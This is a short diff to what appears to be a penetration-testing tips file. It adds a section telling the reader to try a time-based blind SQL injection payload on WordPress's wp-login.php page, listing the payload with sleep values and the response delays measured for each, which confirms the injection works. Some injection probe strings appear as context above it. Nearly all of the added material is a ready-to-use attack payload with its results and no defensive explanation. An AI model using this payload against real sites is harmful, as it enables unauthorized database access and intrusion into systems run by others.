@@ -40,7 +40,14 @@
 	/?q=')
 	/?q=-x()
 
-
+**Try This Payload in Wp-login.php page**
+	0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 20.002
+	0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 7.282
+	0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.912
+	0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 16.553
+	0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.463
+	0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 1.229
+	0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 7.79
 
  #Tip 4:
 =========
